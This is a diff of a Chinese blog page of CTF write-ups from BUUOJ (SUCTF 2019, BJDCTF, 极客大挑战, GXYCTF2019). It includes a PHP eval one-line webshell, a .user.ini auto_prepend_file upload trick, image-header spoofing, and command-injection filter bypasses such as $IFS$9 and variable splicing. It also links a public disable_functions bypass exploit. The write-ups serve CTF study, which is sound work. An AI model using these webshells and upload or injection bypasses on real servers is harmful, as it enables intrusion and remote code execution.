@@ -51,18 +51,18 @@
   };
 </script>
 
-  <meta name="description" content="checkin一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&amp;lt;?,被过滤了，改一下脚本1&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;gt;改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式进行">
+  <meta name="description" content="2019SUCTF1.checkin一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&amp;lt;?,被过滤了，改一下脚本1&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;gt;改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuoj刷题">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;19&#x2F;buuoj%E5%88%B7%E9%A2%98&#x2F;index.html">
 <meta property="og:site_name" content="Gee">
-<meta property="og:description" content="checkin一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&amp;lt;?,被过滤了，改一下脚本1&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;gt;改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式进行">
+<meta property="og:description" content="2019SUCTF1.checkin一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&amp;lt;?,被过滤了，改一下脚本1&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;apos;a&amp;apos;]);&amp;lt;&#x2F;script&amp;gt;改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;2.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;1.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
 <meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7178.JPG">
-<meta property="og:updated_time" content="2020-04-01T13:10:08.076Z">
+<meta property="og:updated_time" content="2020-06-10T14:28:31.902Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;2.JPG">
 
@@ -239,7 +239,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-01 21:10:08" itemprop="dateModified" datetime="2020-04-01T21:10:08+08:00">2020-04-01</time>
+                <time title="修改时间：2020-06-10 22:28:31" itemprop="dateModified" datetime="2020-06-10T22:28:31+08:00">2020-06-10</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -264,13 +264,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&lt;?,被过滤了，改一下脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式进行了检查。继续尝试发现，应该只是检测了文件头<br>，所以上传一个简单的图片马即可，但是这上传的只是一个图片形式，这题目也没有文件包含的漏洞可以给我们利用，想尝试.htaccess来让他把jpg文件当作php执行，但是尝试了一下，<br>失败了，看了wp才知道要用.user.ini,以前从来没有听说过呀，具体原理可以看看这个大佬的文章<a href="https://wooyun.js.org/drops/user.ini文件构成的php后门.html、" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini文件构成的php后门.html、</a><br>大致意思就是，在.user.ini文件中添加内容：auto_prepend_file=xxx.jpg,那么在所有的php文件执行前都会把xxx.jpg 当作php文件先执行一遍，它类似于.htaccess文件，但是应用比他更广</p><a id="more"></a><!-- toc -->
+        <h3 id="2019SUCTF"><a href="#2019SUCTF" class="headerlink" title="2019SUCTF"></a>2019SUCTF</h3><p>1.checkin<br>一道文件上传的题目，直接上传php被拦截，改后缀名上传，发现&lt;?,被过滤了，改一下脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;a&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>改完之后居然还是报错了！！不过他给了提示报错内容为：exif_imagetype:not image! ，这应该是对文件格式进行了检查。继续尝试发现，应该只是检测了文件头<br>，所以上传一个简单的图片马即可，但是这上传的只是一个图片形式，这题目也没有文件包含的漏洞可以给我们利用，想尝试.htaccess来让他把jpg文件当作php执行，但是尝试了一下，<br>失败了，看了wp才知道要用.user.ini,以前从来没有听说过呀，具体原理可以看看这个大佬的文章<a href="https://wooyun.js.org/drops/user.ini文件构成的php后门.html、" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini文件构成的php后门.html、</a><br>大致意思就是，在.user.ini文件中添加内容：auto_prepend_file=xxx.jpg,那么在所有的php文件执行前都会把xxx.jpg 当作php文件先执行一遍，它类似于.htaccess文件，但是应用比他更广</p><a id="more"></a><!-- toc -->
 
 
 
 <p>于是我们可以这样子，先上传一个.user.ini ，其内容为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=webshell.jpg</span><br></pre></td></tr></table></figure>
-<p>然后在上传我们的一句话木马<br><img src="https://github.com/gee617/picture/raw/master/2.JPG" alt><br>访问index.php可以看到，我们的webshell.jpg已经被当作php文件中执行了<br><img src="https://github.com/gee617/picture/raw/master/1.JPG" alt><br>最后system(“cat /flag”);拿到flag</p>
+<p>然后在上传我们的一句话木马<br><img src="https://github.com/gee617/picture/raw/master/2.JPG" alt><br>访问index.php可以看到，我们的webshell.jpg已经被当作php文件中执行了<br><img src="https://github.com/gee617/picture/raw/master/1.JPG" alt><br>最后system(“cat /flag”);拿到flag<br>2.easysql<br>修改sql_modesql_mode，利用“||”拼接字符串，然后直接查询flag<br>3.pythonginx<br>unicode编码问题,例如字符℆ 在后台转码会解析为c/u，以此来绕过if判断</p>
 <!-- toc -->
 <h3 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h3><p>这几天做了一下BUUOJ上的BJDCTF的题目，写一下自己的wp</p>
 <p>1.fake google<br>查看源代码，提示是SSTI注入，这就好办了</p>
@@ -291,7 +291,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name “flag”</span><br></pre></td></tr></table></figure>
 <p>4.假猪套天下第一<br>这道题随便输用户名密码登陆后有个跳转，抓包看看有提示L0g1in.php，然后就是根据他的提示一步步的补充修改http headrs即可</p>
 <!-- toc -->
-<h3 id="Real类"><a href="#Real类" class="headerlink" title="Real类"></a>Real类</h3><p>1.XXE</p>
+<h3 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h3><p>1.sql注入系列<br>easysql:万能密码即可<br>lovesql：没有什么过滤的sql注入，拼接常规的sql注入语句即可<br>babysql:双写绕过<br>hardsql：报错注入<br>finalsql：用异或构造布尔盲注<br>2.havefun：get传参即可获得flag<br>3.secretfile:file伪协议读取文件<br>4.php:简单的反序列化，绕过_wakeup函数即可<br>5.knife：菜刀直接连即可<br>6.http：按照提示，一步步修改http请求头即可<br>7.buyflag；数组绕过strcmp函数即可<br>8.upload:1.phtml绕过黑名单检测2.增加文件头GIF89a绕过图像检测<br>9.RCEME:1.url编码取反绕过正则检测2.重新写入一个shell用蚁剑连接3.上传php7的poc绕过disabled-functions（<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php）</a></p>
+<!-- toc -->
+<h3 id="GXYCTF2019"><a href="#GXYCTF2019" class="headerlink" title="GXYCTF2019"></a>GXYCTF2019</h3><p>1.pingp ping ping :1.$IFS$9绕过空格过滤2.变量名拼接a=l;b=s;$a$b 绕过敏感字符过滤</p>
 
     </div>
 
@@ -354,7 +356,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#checkin"><span class="nav-number">1.</span> <span class="nav-text">checkin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF"><span class="nav-number">2.</span> <span class="nav-text">BJDCTF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Real类"><span class="nav-number">3.</span> <span class="nav-text">Real类</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#2019SUCTF"><span class="nav-number">1.</span> <span class="nav-text">2019SUCTF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BJDCTF"><span class="nav-number">2.</span> <span class="nav-text">BJDCTF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战"><span class="nav-number">3.</span> <span class="nav-text">极客大挑战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019"><span class="nav-number">4.</span> <span class="nav-text">GXYCTF2019</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
